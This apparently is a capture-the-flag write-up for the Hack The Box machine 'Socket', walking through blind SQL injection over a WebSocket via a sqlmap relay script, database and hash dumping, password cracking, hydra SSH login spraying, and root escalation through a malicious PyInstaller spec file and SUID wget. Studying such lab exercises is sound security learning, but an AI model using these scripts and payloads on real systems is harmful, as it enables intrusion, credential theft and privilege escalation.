# Socket - HTB(Medium)
## IP = 10.129.192.146

### NMAP

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://qreader.htb/
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
5789/tcp open  unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad Request            
|     Date: Sat, 25 Mar 2023 21:31:15 GMT 
|     Server: Python/3.10 websockets/10.4 
|     Content-Length: 77                  
|     Content-Type: text/plain            
|     Connection: close                   
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.                                                  
|   Help, SSLSessionReq:                  
|     HTTP/1.1 400 Bad Request            
|     Date: Sat, 25 Mar 2023 21:31:31 GMT 
|     Server: Python/3.10 websockets/10.4 
|     Content-Length: 77                  
|     Content-Type: text/plain            
|     Connection: close                   
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.                                                  
|   RTSPRequest:      
|     HTTP/1.1 400 Bad Request            
|     Date: Sat, 25 Mar 2023 21:31:16 GMT 
|     Server: Python/3.10 websockets/10.4 
|     Content-Length: 77                  
|     Content-Type: text/plain            
|     Connection: close                   
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.

```

Now those nmap results didn't come from a regular nmap scan I scanned all the ports for it to find the `5789`. So lets start from there.


### Web Socket Enumeration

So lets get started from the websocket, lets create a python script to connect to the websocket.

```
#!/usr/bin/env python3

import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://qreader.htb:5789")
d = {"message": "hello"}
data = str(json.dumps(d))
ws.send(data)
result = ws.recv()
print(json.loads(result))

```

The output:

```

$ python3 wsConnection.py
{'paths': {'/update': 'Check for updates', '/version': 'Get version information'}}

```

Interesting so we got two paths, version and update lets start with version first.

```

#!/usr/bin/env python3

import websocket,json

ws = websocket.WebSocket()
ws_host = 'ws://qreader.htb:5789'
version = 0.1
ws.connect(ws_host + "/version")
d = {"version": f"{version}"}
data = str(json.dumps(d))
ws.send(data)
result = ws.recv()
print(json.loads(result))

```

```

$ python3 wsConnection.py
{'message': 'Invalid version!'}

```
Great so can access the version message although it doesn't seem like it. I poked around and found the following article about blind sqli in websockets, so that got me thinking there maybe is a sqli in this message. 
Credit: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

So lets enter the script and edit a couple of stuff.

```

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://qreader.htb:5789/version" # enter the qreader.htb host with the ws port and the /version path.

def send_ws(payload):
	ws = create_connection(ws_server)

	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('\'','\\\"') # The escape that the blog suggested didn't so we needed to change payloads found that \" worked.
	data = '{"version":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass


```

Great after editing it for our need we can run the server and then run it with sqlmap. 

```
(Window 1)$ python3 server.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
(Window 2)$ /opt/Tools/sqlmap-dev/sqlmap.py -u "http://localhost:8081/?id=1" --batch --dbs --level 5 --risk 3
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 268 HTTP(s) requests:  
---                     
Parameter: id (GET)     
    Type: boolean-based blind                            
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)                          
    Payload: id=1' OR NOT 5442=5442-- LaDw               
                        
    Type: time-based blind                               
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: id=1' OR 6724=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- LuBE
                  
    Type: UNION query                  
    Title: Generic UNION query (NULL) - 4 columns           
    Payload: id=1' UNION ALL SELECT NULL,NULL,NULL,CHAR(113,122,107,106,113)||CHAR(98,65,107,79,67,70,87,120,70,79,76,85,11
2,119,65,84,107,109,107,109,83,75,120,89,109,68,73,74,73,122,86,122,79,72,76,104,70,117,106,108)||CHAR(113,118,118,112,113)
-- Evhz                                
---                                                                                       
[07:54:38] [INFO] the back-end DBMS is SQLite                                                                              
back-end DBMS: SQLite

```


```
$ /opt/Tools/sqlmap-dev/sqlmap.py -u "http://localhost:8081/?id=1" --batch --level 5 --risk 3 --tables

+-----------------+
| answers         |
| info            |
| reports         |
| sqlite_sequence |
| users           |
| versions        |
+-----------------+

$ /opt/Tools/sqlmap-dev/sqlmap.py -u "http://localhost:8081/?id=1" --batch --level 5 --risk 3 -T users --columns

+----------+---------+
| Column   | Type    |
+----------+---------+
| id       | INTEGER |
| password | DATE    |
| role     | TEXT    |
| username | TEXT    |
+----------+---------+

$ /opt/Tools/sqlmap-dev/sqlmap.py -u "http://localhost:8081/?id=1" --batch --level 5 --risk 3 -T users -dump

+----+-------+----------------------------------+----------+
| id | role  | password                         | username |
+----+-------+----------------------------------+----------+
| 1  | admin | 0c090c365fa0559b151a43e0fea39710 | admin    |
+----+-------+----------------------------------+----------+

$ /opt/Tools/sqlmap-dev/sqlmap.py -u "http://localhost:8081/?id=1" --batch --level 5 --risk 3 -T answers -dump

+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+
| id | answer                                                                          | status  | answered_by | answered_date |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+
| 1  | Hello Json,\\n\\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\\n\\nThomas Keller                                       | PENDING | admin       | 17/08/2022    |
| 2  | Hello Mike,\\n\\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\\n\\nThomas Keller | PENDING | admin       | 25/09/2022    |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+-------------+---------------+


```

So we got the admin's full name and hashed password, so let's try and crack it. It was fairly easy I went to a site called: https://crackstation.net/ and got the password which is: `denjanjade122566`. Now if you try to login with admin, it wouldn't work. We need to find how to shorten the full name to find the username.


There's a tool called `username-anarchy` that you can add a user's full name and the tool will output a couple combos with that name.

```

$ ./username-anarchy Thomas Keller > usernames.txt
$ hydra -L usernames.txt -p 'denjanjade122566' ssh://qreader.htb
[22][ssh] host: qreader.htb   login: tkeller   password: denjanjade122566

$ ssh tkeller@qreader.htb
password: denjanjade122566
tkeller@socket:~$ cat user.txt
58737f2c54d6a95a18d58a564698c07f

```

### Privilege Escalation 

When running `sudo -l` you can see that we can run a bash file

```

tkeller@socket:/dev/shm/my_dir$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                
                                                
User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh

```

When viewing that file you can see the following statement:

```

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi

```

This statement takes a spec file, and uses pyinstaller to build the spec file as a python executable. If you search a little bit online you can find that in a spec file you can import python modules. so you can create a malicious spec file that at the time of build it will execute a command. You can do that as follows:

```

tkeller@socket:/dev/shm/my_dir$ cat /dev/shm/my_dir/main.spec
# -*- mode: python -*-
import subprocess

subprocess.Popen('sudo chmod +s /usr/bin/wget', shell=True)

```

What it does is it changes the permissions of the `wget` command for it to be SUID and by that we can escalate our privileges.

```

tkeller@socket:/dev/shm/my_dir$ sudo /usr/local/sbin/build-installer.sh build main.spec
tkeller@socket:/dev/shm/my_dir$ TF=$(mktemp)
tkeller@socket:/dev/shm/my_dir$ chmod +x $TF
tkeller@socket:/dev/shm/my_dir$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
tkeller@socket:/dev/shm/my_dir$ /usr/bin/wget --use-askpass=$TF 0
# bash -p
bash-5.1# whoami && id && cat /root/root.txt
root
uid=1001(tkeller) gid=1001(tkeller) euid=0(root) egid=0(root) groups=0(root),1001(tkeller),1002(shared)
4fc0440bc2d9cc4883d01db77c2f1504

```

And that was all that was a fairly easy privEsc but way harder to get the foothold, you need to keep it simple in the privesc here and you'll get it done. Thanks for tuning in, Cheers mates.
